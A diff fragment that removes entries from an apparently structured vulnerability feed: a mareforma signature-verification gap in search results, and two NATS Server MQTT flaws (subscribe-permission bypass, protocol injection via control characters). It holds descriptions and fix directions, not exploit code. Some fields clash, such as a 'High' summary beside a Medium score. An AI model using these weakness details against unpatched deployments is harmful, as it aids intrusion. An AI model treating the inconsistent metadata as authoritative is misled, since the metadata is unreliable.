-        "https://github.com/mareforma/mareforma/releases/tag/v0.3.8"
-      ],
-      "vulnerableProducts": [
-        "mareforma pip"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-71533",
-      "summary": "## What's wrong\n\n`search_claims` never calls `_row_verified_on_read`. Its row loop applies only the PRELIMINARY-unenrolled filter, then appends the row. `query_claims` runs the same projection but additionally re-verifies REPLICATED/ESTABLISHED signatures on read (line 4023) and drops any row that fails, per the documented tamper guarantee in the comment block above it: a high-trust row whose signature does not verify is excluded from query results entirely.\n\nSo a tampered or forged high-trust row splits the two read paths. Any process with DB write access, or an attacker copying a genuine validation envelope onto a fresh row, can flip a row to ESTABLISHED. `query()` drops it; `search()` serves it at its persisted trust level. Verified in a runtime check against a forged ESTABLISHED row:\n\n```\nquery() returns forged row: False\nsearch() returns forged row: True   # support_level ESTABLISHED, 'verified' key absent\n```\n\nThe docstring makes this worse: `search_claims` promises \"the same projection as query_claims\" and that the `include_unverified` filter \"applies identically\", so callers reasonably trust search results equally. The forged row also lacks the `verified` key entirely, so a consumer cannot tell it went unchecked.\n\n## Severity and impact\n\n**High.** The verify-on-read tamper exclusion is a stated trust guarantee, and search is a primary read surface. A forged ESTABLISHED finding that query correctly rejects is served by search as genuine, with no marker that verification was skipped.\n\n## Location\n\n- `mareforma/db/core.py:4206` search_claims row loop applies only the PRELIMINARY-unenrolled filter, then appends\n- `mareforma/db/core.py:4114` search_claims signature and docstring, which claims query_claims-identical semantics\n- `mareforma/db/core.py:4023` query_claims verify-on-read call that search_claims lacks\n\n## Fix direction\n\nMirror `query_claims`: add a `verify_cache: dict = {}` and, inside the search_claims row loop after the include_unverified check, drop rows that fail `_row_verified_on_read(conn, d, verify_cache)`. Since the verify filter can drop rows even when `include_unverified=True`, remove the single-batch break on `include_unverified` and keep batching until `limit` survivors or the FTS5 match-set is exhausted, with the same scan ceiling `query_claims` uses. Also set `single_trust_domain` / `trust_domain_root` on surviving ESTABLISHED rows if the \"same projection\" promise is to hold.\n\nDo red/green TDD: add a regression test that fails on `main`, then make it pass.\n\n## Quality bar\n\nSOLID, DRY, KISS. Clean, readable, well-tested code. No new errors, warnings, or test failures; the full suite stays green on all supported Python versions.",
-      "cvssScore": 6.8,
-      "severity": "Medium",
-      "published": "2026-11-19",
-      "modified": "2026-11-19",
-      "cwe": {
-        "cwe_id": "CWE-347",
-        "name": "Improper Verification of Cryptographic Signature"
-      },
-      "references": [
-        "https://github.com/mareforma/mareforma/security/advisories/GHSA-m29v-3g7g-9c63",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-71533",
-        "https://github.com/mareforma/mareforma/pull/58",
-        "https://github.com/mareforma/mareforma/commit/8b5291792128326a22f240123659d2754446c194",
-        "https://github.com/mareforma/mareforma/releases/tag/v0.3.8"
-      ],
-      "vulnerableProducts": [
-        "mareforma pip"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-58214",
-      "summary": "### Background\n\nNATS.io is a high performance open source pub-sub distributed communication technology, built for the cloud, on-premise, IoT and edge computing.\n\nThe NATS Server MQTT support uses internal `$MQTT.*` subjects to implement MQTT protocol features such as QoS handling.\n\n### Problem Description\n\nAn authenticated MQTT client could subscribe to an internal MQTT delivery subject that was not intended to be available to clients.\n\nThis bypassed configured subscribe permissions for that internal subject family and exposed MQTT QoS2 protocol metadata for sessions in the account. Message payloads were not exposed through this path.\n\nThis issue was related to an incomplete restriction on internal MQTT subjects. It affected MQTT users whose ordinary subscribe permissions would not otherwise allow access to those internal subjects.\n\n### Affected Versions\n\nVersions v2.14.2, v2.12.7 and below are vulnerable. The issue is fixed in v2.14.3 and v2.12.8.\n\n### Workarounds\n\nNo known workaround for deployments that require MQTT. Upgrade to a fixed release. Deployments not using MQTT are not affected.\n\n### References\n\n * GHSA advisory: <https://github.com/nats-io/nats-server/security/advisories/GHSA-4g68-3pwx-5vfj>\n * Credit: Koda Reef",
-      "cvssScore": 4.3,
-      "severity": "Medium",
-      "published": "2026-11-19",
-      "modified": "2026-11-19",
-      "cwe": {
-        "cwe_id": "CWE-863",
-        "name": "Incorrect Authorization"
-      },
-      "references": [
-        "https://github.com/nats-io/nats-server/security/advisories/GHSA-4g68-3pwx-5vfj",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-58214",
-        "https://github.com/nats-io/nats-server/commit/297b166be60fe13144084eed4b25201ead03204a",
-        "https://github.com/nats-io/nats-server/commit/34b09657bb596d5f850eaa5cfc97ea6b2f989a97",
-        "https://github.com/nats-io/nats-server/releases/tag/v2.12.12"
-      ],
-      "vulnerableProducts": [
-        "github.com/nats-io/nats-server/v2 go"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-58213",
-      "summary": "### Background\n\nNATS.io is a high performance open source pub-sub distributed communication technology, built for the cloud, on-premise, IoT and edge computing.\n\nThe NATS Server supports MQTT clients and can bridge MQTT activity into NATS subjects across routes and leafnode connections.\n\n### Problem Description\n\nAn MQTT client could include protocol control characters in subscription filters that were later forwarded as NATS protocol data to route or leafnode connections.\n\nThis could corrupt the forwarded protocol stream and allow injection of unintended NATS protocol operations, potentially across cluster nodes or accounts where route or gateway connections are present.\n\nAnonymous MQTT deployments are higher risk because no credentials are required to reach the affected parser. Authenticated deployments are still affected for clients allowed to create MQTT subscriptions.\n\n### Affected Versions\n\nVersions v2.14.0, v2.12.8 and below are vulnerable. The issue is fixed in v2.14.1 and v2.12.9.\n\n### Workarounds\n\nDisable anonymous MQTT access where it is not required. Deployments that need MQTT have no known complete workaround other than upgrading.\n\n### References\n\n * GHSA advisory: <https://github.com/nats-io/nats-server/security/advisories/GHSA-qrcv-3558-gj4f>\n * Credit: @thesecguy45",
-      "cvssScore": 7.1,
-      "severity": "High",
-      "published": "2026-11-19",
-      "modified": "2026-11-19",
-      "cwe": {
-        "cwe_id": "CWE-74",
-        "name": "Improper Neutralization of Special Elements in Output Used by a Downstream Component"
-      },
-      "references": [
-        "https://github.com/nats-io/nats-server/security/advisories/GHSA-qrcv-3558-gj4f",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-58213",
-        "https://github.com/nats-io/nats-server/pull/8163",
-        "https://github.com/nats-io/nats-server/pull/8164",
-        "https://github.com/nats-io/nats-server/commit/366837cfc65ab9ccb4f98193c65e8daf238582d8"
-      ],
-      "vulnerableProducts": [
-        "github.com/nats-io/nats-server/v2 go"
+        "github.com/omec-project/amf go"
       ],
       "isExploited": false
     }
